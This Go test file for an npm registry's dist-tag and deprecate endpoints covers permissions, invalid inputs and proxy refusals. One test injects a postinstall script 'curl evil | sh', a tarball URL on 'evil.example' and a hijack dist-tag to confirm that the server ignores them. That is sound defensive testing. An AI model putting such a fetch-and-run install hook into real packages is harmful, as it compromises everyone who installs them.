		if err := f.reg.SetDeprecations(ctx, testRepo, "foo", map[string]string{"1.9.0": "use 1.10"}); err != nil {
			t.Fatalf("SetDeprecations: %v", err)
		}
		if err := f.reg.DeleteFile(ctx, testRepo, "foo", "1.0.0", "foo-1.0.0.tgz", "alice"); err != nil {
			t.Fatalf("DeleteFile: %v", err)
		}

		doc := f.packument("foo")
		if got := doc.DistTags["latest"]; got != "1.10.0" {
			t.Fatalf("latest = %q, want 1.10.0; dist-tags %v", got, doc.DistTags)
		}
		if dep, _ := doc.field(t, "1.9.0", "deprecated"); string(dep) != `"use 1.10"` {
			t.Fatalf("deprecated = %s", dep)
		}
		if dep, ok := doc.field(t, "1.10.0", "deprecated"); ok {
			t.Fatalf("1.10.0 is reported deprecated: %s", dep)
		}

		stored, err := f.reg.GetNPMPackage(ctx, testRepo, "foo")
		if err != nil {
			t.Fatalf("GetNPMPackage: %v", err)
		}
		if tag, ok := stored.DistTags["latest"]; ok {
			t.Fatalf("reading the packument wrote latest = %q", tag)
		}
	})

	t.Run("the highest prerelease when only prereleases are left", func(t *testing.T) {
		f.mustPublish("bar", "1.0.0")
		for _, v := range []string{"2.0.0-beta.2", "2.0.0-beta.10"} {
			f.mustPublishTagged("bar", v, "next")
		}
		if err := f.reg.DeleteFile(ctx, testRepo, "bar", "1.0.0", "bar-1.0.0.tgz", "alice"); err != nil {
			t.Fatalf("DeleteFile: %v", err)
		}
		if got := f.packument("bar").DistTags["latest"]; got != "2.0.0-beta.10" {
			t.Fatalf("latest = %q, want 2.0.0-beta.10", got)
		}
	})
}

func (f *npmFixture) distTagsPath(pkgPath, tag string) string {
	path := "/npm/" + testRepo + "/-/package/" + url.PathEscape(pkgPath) + "/dist-tags"
	if tag != "" {
		path += "/" + tag
	}
	return path
}

func (f *npmFixture) distTags(token, pkgPath string) (int, map[string]string) {
	f.t.Helper()
	status, got, _ := f.do(token, http.MethodGet, f.distTagsPath(pkgPath, ""), nil)
	var tags map[string]string
	if status == http.StatusOK {
		if err := json.Unmarshal(got, &tags); err != nil {
			f.t.Fatalf("decoding dist-tags: %v\n%s", err, got)
		}
	}
	return status, tags
}

func TestDistTags_ListAddRemove(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")

	if status, tags := f.distTags(readerToken, "foo"); status != http.StatusOK || !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
		t.Fatalf("GET = %d %v, want latest only", status, tags)
	}
	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "beta"), []byte(`"1.0.0"`)); status != http.StatusCreated {
		t.Fatalf("PUT = %d %s, want 201", status, got)
	}
	if _, tags := f.distTags(adminToken, "foo"); tags["beta"] != "1.0.0" {
		t.Fatalf("tags after PUT = %v", tags)
	}
	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "beta"), nil); status != http.StatusCreated {
		t.Fatalf("DELETE = %d %s, want 201", status, got)
	}
	if _, tags := f.distTags(adminToken, "foo"); len(tags) != 1 {
		t.Fatalf("tags after DELETE = %v", tags)
	}
	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "latest"), nil); status != http.StatusBadRequest {
		t.Fatalf("DELETE latest = %d %s, want 400", status, got)
	}
	if status, got, _ := f.do(adminToken, http.MethodDelete, f.distTagsPath("foo", "beta"), nil); status != http.StatusNotFound {
		t.Fatalf("DELETE missing tag = %d %s, want 404", status, got)
	}
}

func TestDistTags_ScopedNameAndFallbackLatest(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublishTo(testRepo, "@acme/ui", "@acme/ui", "1.0.0", packageTarball(t, "@acme/ui", "1.0.0"))
	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("@acme/ui", "beta"), []byte(`"1.0.0"`)); status != http.StatusCreated {
		t.Fatalf("PUT scoped = %d %s, want 201", status, got)
	}
	f.mustPublishTagged("bar", "1.0.0", "next")
	if err := f.reg.RemoveDistTag(t.Context(), testRepo, "bar", "latest", "x"); err == nil {
		t.Fatal("registry removed latest")
	}
	if _, err := f.data.Pool().Exec(t.Context(), `DELETE FROM dist_tags WHERE tag = 'latest'`); err != nil {
		t.Fatalf("deleting latest: %v", err)
	}
	if _, tags := f.distTags(adminToken, "bar"); tags["latest"] != "1.0.0" {
		t.Fatalf("GET without a latest row = %v, want the fallback readers see", tags)
	}
}

func TestDistTags_MovingLatestChangesTheDefault(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	f.mustPublishTagged("foo", "2.0.0", "next")
	if got := f.packument("foo").DistTags["latest"]; got != "1.0.0" {
		t.Fatalf("latest = %q before the move", got)
	}
	if status, got, _ := f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "latest"), []byte(`"2.0.0"`)); status != http.StatusCreated {
		t.Fatalf("PUT = %d %s, want 201", status, got)
	}
	if got := f.packument("foo").DistTags["latest"]; got != "2.0.0" {
		t.Fatalf("latest = %q after the move, want 2.0.0", got)
	}
	// The same move again writes nothing.
	before := f.count(`SELECT count(*) FROM dist_tag_events`)
	f.do(adminToken, http.MethodPut, f.distTagsPath("foo", "latest"), []byte(`"2.0.0"`))
	if after := f.count(`SELECT count(*) FROM dist_tag_events`); after != before {
		t.Fatalf("events %d -> %d for a no-op move", before, after)
	}
}

func TestDistTags_ReadOnlyCallerCannotMove(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	if status, got, _ := f.do(readerToken, http.MethodPut, f.distTagsPath("foo", "beta"), []byte(`"1.0.0"`)); status != http.StatusForbidden {
		t.Fatalf("PUT = %d %s, want 403", status, got)
	}
	if status, got, _ := f.do(readerToken, http.MethodDelete, f.distTagsPath("foo", "latest"), nil); status != http.StatusForbidden {
		t.Fatalf("DELETE = %d %s, want 403", status, got)
	}
	if _, tags := f.distTags(adminToken, "foo"); !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
		t.Fatalf("tags = %v, want unchanged", tags)
	}
	if status, _ := f.distTags(outsiderToken, "foo"); status != http.StatusNotFound {
		t.Fatalf("GET by an outsider = %d, want 404", status)
	}
}

func TestDistTags_InvalidInputs(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	cases := []struct {
		name   string
		method string
		pkg    string
		tag    string
		body   string
		want   int
	}{
		{name: "a tag that reads as a version", method: http.MethodPut, pkg: "foo", tag: "1.0.0", body: `"1.0.0"`, want: http.StatusBadRequest},
		{name: "an unknown version", method: http.MethodPut, pkg: "foo", tag: "beta", body: `"9.9.9"`, want: http.StatusNotFound},
		{name: "a body that is not a string", method: http.MethodPut, pkg: "foo", tag: "beta", body: `{"v":"1.0.0"}`, want: http.StatusBadRequest},
		{name: "a body that is not JSON", method: http.MethodPut, pkg: "foo", tag: "beta", body: `1.0.0`, want: http.StatusBadRequest},
		{name: "a body over the bound", method: http.MethodPut, pkg: "foo", tag: "beta", body: `"` + strings.Repeat("1", 4<<10) + `"`, want: http.StatusRequestEntityTooLarge},
		{name: "an unknown package", method: http.MethodPut, pkg: "nope", tag: "beta", body: `"1.0.0"`, want: http.StatusNotFound},
		{name: "an invalid package name", method: http.MethodPut, pkg: "Foo", tag: "beta", body: `"1.0.0"`, want: http.StatusNotFound},
		{name: "an invalid tag on delete", method: http.MethodDelete, pkg: "foo", tag: "1.0.0", want: http.StatusBadRequest},
		{name: "get of an unknown package", method: http.MethodGet, pkg: "nope", want: http.StatusNotFound},
		{name: "post", method: http.MethodPost, pkg: "foo", tag: "beta", want: http.StatusMethodNotAllowed},
		{name: "put without a tag", method: http.MethodPut, pkg: "foo", body: `"1.0.0"`, want: http.StatusMethodNotAllowed},
		{name: "get with a tag", method: http.MethodGet, pkg: "foo", tag: "beta", want: http.StatusMethodNotAllowed},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			status, got, _ := f.do(adminToken, tc.method, f.distTagsPath(tc.pkg, tc.tag), []byte(tc.body))
			if status != tc.want {
				t.Fatalf("%s = %d %s, want %d", tc.method, status, got, tc.want)
			}
			wantJSONError(t, got)
		})
	}
	if _, tags := f.distTags(adminToken, "foo"); !cmp.Equal(tags, map[string]string{"latest": "1.0.0"}) {
		t.Fatalf("tags = %v, want unchanged", tags)
	}
}

func TestDistTags_ProxyAndVirtualAreRefused(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.createRepo(registry.CreateRepositoryParams{Name: "up", Type: model.RepoTypeProxy, UpstreamURL: "https://registry.npmjs.org"})
	for _, tc := range []struct {
		method string
		body   string
		want   int
	}{
		{http.MethodGet, "", http.StatusNotImplemented},
		{http.MethodPut, `"1.0.0"`, http.StatusMethodNotAllowed},
		{http.MethodDelete, "", http.StatusMethodNotAllowed},
	} {
		tag := "beta"
		path := "/npm/up/-/package/foo/dist-tags"
		if tc.method != http.MethodGet {
			path += "/" + tag
		}
		if status, got, _ := f.do(adminToken, tc.method, path, []byte(tc.body)); status != tc.want {
			t.Fatalf("%s = %d %s, want %d", tc.method, status, got, tc.want)
		}
	}
}

// deprecateBody is what npm deprecate sends: the packument, without attachments,
// with the named versions' deprecated fields set.
func (f *npmFixture) deprecateBody(name string, deprecated map[string]any) map[string]any {
	f.t.Helper()
	versions := map[string]any{}
	for v, d := range deprecated {
		entry := map[string]any{"name": name, "version": v}
		if d != absent {
			entry["deprecated"] = d
		}
		versions[v] = entry
	}
	return map[string]any{"_id": name, "name": name, "versions": versions}
}

// absent marks a listed version that carries no deprecated field.
var absent = struct{}{}

func (f *npmFixture) deprecate(token string, doc map[string]any) (int, []byte) {
	f.t.Helper()
	status, got, _ := f.do(token, http.MethodPut, "/npm/"+testRepo+"/"+doc["name"].(string), encodeDocument(f.t, doc))
	return status, got
}

func (f *npmFixture) deprecatedOf(name, version string) string {
	f.t.Helper()
	raw, ok := f.packument(name).field(f.t, version, "deprecated")
	if !ok {
		return ""
	}
	var s string
	if err := json.Unmarshal(raw, &s); err != nil {
		f.t.Fatalf("decoding deprecated: %v", err)
	}
	return s
}

func TestDeprecate_OnlyTheDeprecatedFieldIsRead(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	f.mustPublish("foo", "2.0.0")
	before := f.packument("foo")

	doc := f.deprecateBody("foo", map[string]any{"1.0.0": "use 2"})
	entry := member(t, doc, "versions", "1.0.0")
	entry["dist"] = map[string]any{"tarball": "http://evil.example/x.tgz", "integrity": "sha512-AAAA", "shasum": "00"}
	entry["dependencies"] = map[string]any{"evil": "1.0.0"}
	entry["scripts"] = map[string]any{"postinstall": "curl evil | sh"}
	doc["dist-tags"] = map[string]any{"latest": "1.0.0", "hijack": "1.0.0"}
	if status, got := f.deprecate(adminToken, doc); status != http.StatusCreated {
		t.Fatalf("deprecate = %d %s, want 201", status, got)
	}

	after := f.packument("foo")
	if !cmp.Equal(after.DistTags, before.DistTags) {
		t.Fatalf("dist-tags %v -> %v", before.DistTags, after.DistTags)
	}
	if string(after.Versions["2.0.0"]) != string(before.Versions["2.0.0"]) {
		t.Fatal("an unlisted version changed")
	}
	var was, now map[string]json.RawMessage
	if err := json.Unmarshal(before.Versions["1.0.0"], &was); err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(after.Versions["1.0.0"], &now); err != nil {
		t.Fatal(err)
	}
	if string(now["deprecated"]) != `"use 2"` {
		t.Fatalf("deprecated = %s", now["deprecated"])
	}
	delete(now, "deprecated")
	if !cmp.Equal(was, now) {
		t.Fatalf("something besides deprecated changed:\n%s\n%s", before.Versions["1.0.0"], after.Versions["1.0.0"])
	}
}

func TestDeprecate_ClearAndAbsent(t *testing.T) {
	f := newFixture(t, testPublicURL)
	for _, v := range []string{"1.0.0", "2.0.0", "3.0.0"} {
		f.mustPublish("foo", v)
	}
	if status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "a", "2.0.0": "b", "3.0.0": "c"})); status != http.StatusCreated {
		t.Fatalf("deprecate = %d %s", status, got)
	}

	// 1.0.0 is cleared by an empty string, 2.0.0 by a missing field, and 3.0.0
	// is not listed.
	if status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "", "2.0.0": absent})); status != http.StatusCreated {
		t.Fatalf("clear = %d %s", status, got)
	}
	for v, want := range map[string]string{"1.0.0": "", "2.0.0": "", "3.0.0": "c"} {
		if got := f.deprecatedOf("foo", v); got != want {
			t.Fatalf("deprecated of %s = %q, want %q", v, got, want)
		}
	}
}

func TestDeprecate_UnknownVersionIs404AndWritesNothing(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	status, got := f.deprecate(adminToken, f.deprecateBody("foo", map[string]any{"1.0.0": "old", "9.9.9": "x"}))
	if status != http.StatusNotFound {
		t.Fatalf("deprecate = %d %s, want 404", status, got)
	}
	if d := f.deprecatedOf("foo", "1.0.0"); d != "" {
		t.Fatalf("1.0.0 deprecated = %q after a refused call", d)
	}
}

func TestDeprecate_Refusals(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	cases := []struct {
		name string
		body string
		want int
	}{
		{name: "message over the limit", body: fmt.Sprintf(`{"name":"foo","versions":{"1.0.0":{"deprecated":%q}}}`, strings.Repeat("x", 4<<10+1)), want: http.StatusBadRequest},
		{name: "no versions", body: `{"name":"foo"}`, want: http.StatusBadRequest},
		{name: "empty versions", body: `{"name":"foo","versions":{}}`, want: http.StatusBadRequest},
		{name: "a different name", body: `{"name":"bar","versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
		{name: "no name", body: `{"versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
		{name: "deprecated is not a string", body: `{"name":"foo","versions":{"1.0.0":{"deprecated":5}}}`, want: http.StatusBadRequest},
		{name: "a version that is not an object", body: `{"name":"foo","versions":{"1.0.0":"x"}}`, want: http.StatusBadRequest},
		{name: "a repeated versions key is read last", body: `{"name":"foo","versions":{"1.0.0":{"deprecated":"x"}},"versions":{}}`, want: http.StatusBadRequest},
		{name: "a repeated name key is read last", body: `{"name":"foo","name":"bar","versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusBadRequest},
		{name: "an empty attachments key", body: `{"name":"foo","_attachments":{},"versions":{"1.0.0":{"deprecated":"x"}}}`, want: http.StatusCreated},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			status, got, _ := f.do(adminToken, http.MethodPut, "/npm/"+testRepo+"/foo", []byte(tc.body))
			if status != tc.want {
				t.Fatalf("PUT = %d %s, want %d", status, got, tc.want)
			}
			if status != http.StatusCreated {
				wantJSONError(t, got)
			}
		})
	}
}

func TestDeprecate_ReadOnlyCallerGets403(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.mustPublish("foo", "1.0.0")
	if status, got := f.deprecate(readerToken, f.deprecateBody("foo", map[string]any{"1.0.0": "x"})); status != http.StatusForbidden {
		t.Fatalf("deprecate = %d %s, want 403", status, got)
	}
	if d := f.deprecatedOf("foo", "1.0.0"); d != "" {
		t.Fatalf("deprecated = %q", d)
	}
}

func TestDeprecate_OnAProxyIs405(t *testing.T) {
	f := newFixture(t, testPublicURL)
	f.createRepo(registry.CreateRepositoryParams{Name: "up", Type: model.RepoTypeProxy, UpstreamURL: "https://registry.npmjs.org"})
	body := encodeDocument(t, f.deprecateBody("foo", map[string]any{"1.0.0": "x"}))
	if status, got, _ := f.do(adminToken, http.MethodPut, "/npm/up/foo", body); status != http.StatusMethodNotAllowed {
		t.Fatalf("PUT = %d %s, want 405", status, got)
	}
}
